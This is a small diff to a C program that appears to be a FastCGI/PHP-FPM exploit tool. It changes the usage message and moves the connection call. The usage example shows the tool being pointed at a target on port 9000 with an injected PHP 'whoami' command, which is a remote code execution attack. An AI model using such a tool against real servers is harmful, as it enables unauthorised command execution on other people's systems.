@@ -245,14 +245,15 @@ int main(int argc, char ** argv){
             }
         }
     }else{
-        printf("Wrong number of argc ! Please enter the correct parameters.\n\n-t target\n-p port\n-c php script\n-f file\n\nEg:./a.out -t 8.8.8.8 -p 9000 -c \"<?php echo \\`whoami\\`;?>\" -f \"/usr/local/lib/php/PEAR.php\"\n\n");
+        printf("Wrong number of argc ! Please enter the correct parameters.\n\n-t target\n-p port\n-c php script\n-f file\n\nEg:%s -t 8.8.8.8 -p 9000 -c \"<?php echo \\`whoami\\`;?>\" -f \"/usr/local/lib/php/PEAR.php\"\n\n",argv[0]);
         exit(0);
     }
     requestId = rand()%100+1;
-    SendStartRequestRecord(ipaddr, port);
     int payloadLen = strlen(payload)+1;
     char content_length[10];
     sprintf(content_length,"%d",payloadLen);
+    //发起连接
+    SendStartRequestRecord(ipaddr, port);
     //发送键值对
     SendKeyValue(path,content_length);
     //发送结束Record
